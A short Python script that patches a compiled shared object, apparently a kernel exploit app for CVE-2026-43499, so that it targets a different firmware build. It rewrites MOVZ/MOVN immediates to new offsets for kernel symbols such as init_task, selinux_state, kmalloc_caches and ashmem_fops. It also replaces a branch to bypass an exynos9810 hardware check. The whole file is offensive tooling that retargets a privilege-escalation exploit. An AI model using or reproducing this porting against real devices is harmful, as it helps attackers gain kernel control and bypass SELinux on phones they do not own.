#!/usr/bin/env python3
"""Patch closed GZF1 engine -> FZA1. movz: stored=low16; movn: stored=0xFFFF-low16."""
import struct, hashlib

SRC = "/mnt/d/codes/rmg-f731u/support/cve-2026-43499-app.so"
DST = "/mnt/d/codes/fw/gzf1-fza1.so"

# FZA1 symbol low16 values
FZA1 = {
    "ashmem_fops": 0x6DE0, "anon_pipe_buf_ops": 0x8120, "kmalloc_caches": 0xD998,
    "def_chr_fops+0x20": 0x8680, "init_task": 0xA840, "root_task_group": 0xAAC0,
    "ashmem_ioctl": 0x0834, "sysctl_bootid": 0xBF31, "selinux_state": 0xF430,
}

# (word_addr, kind, symbol)
SITES = [
    (0x5678, "movz", "init_task"),
    (0x569C, "movz", "root_task_group"),
    (0x59C4, "movz", "ashmem_ioctl"),
    (0x67EC, "movz", "ashmem_fops"),
    (0x68B8, "movn", "ashmem_fops"),
    (0x6964, "movn", "ashmem_fops"),
    (0x6B7C, "movn", "ashmem_fops"),
    (0x6BDC, "movn", "ashmem_fops"),
    (0x69D4, "movz", "sysctl_bootid"),
    (0x7470, "movz", "anon_pipe_buf_ops"),
    (0x754C, "movz", "anon_pipe_buf_ops"),
    (0x765C, "movz", "anon_pipe_buf_ops"),
    (0x7AF4, "movz", "anon_pipe_buf_ops"),
    (0x7478, "movn", "anon_pipe_buf_ops"),
    (0x7554, "movn", "anon_pipe_buf_ops"),
    (0x766C, "movn", "anon_pipe_buf_ops"),
    (0x7AFC, "movn", "anon_pipe_buf_ops"),
    (0x7664, "movn", "def_chr_fops+0x20"),
    (0x78AC, "movz", "kmalloc_caches"),
    (0x789C, "movn", "kmalloc_caches"),
    (0x7FE8, "movz", "selinux_state"),
]

data = bytearray(open(SRC, "rb").read())
for addr, kind, sym in SITES:
    low16 = FZA1[sym]
    imm = low16 if kind == "movz" else (0xFFFF - low16) & 0xFFFF
    w = struct.unpack_from("<I", data, addr)[0]
    old = (w >> 5) & 0xFFFF
    assert ((w >> 23) & 0x3F) == 0b100101, hex(addr)
    assert (((w >> 29) & 3) == (0 if kind == "movn" else 2)), (hex(addr), kind)
    w = (w & ~(0xFFFF << 5)) | (imm << 5)
    struct.pack_into("<I", data, addr, w)
    print(f"{addr:#07x} {kind} {sym}: {old:#06x} -> {imm:#06x}")

open(DST, "wb").write(bytes(data))
print("md5:", hashlib.md5(bytes(data)).hexdigest())

# bypass second exynos9810 hardware check: cbz w0 -> b (always skip)
import struct as _s
_d = bytearray(open(DST, "rb").read())
_s.pack_into("<I", _d, 0x2D00, 0x1400000C)  # b #0x2d30
open(DST, "wb").write(bytes(_d))
print("hw-check bypassed, md5:", hashlib.md5(bytes(_d)).hexdigest())
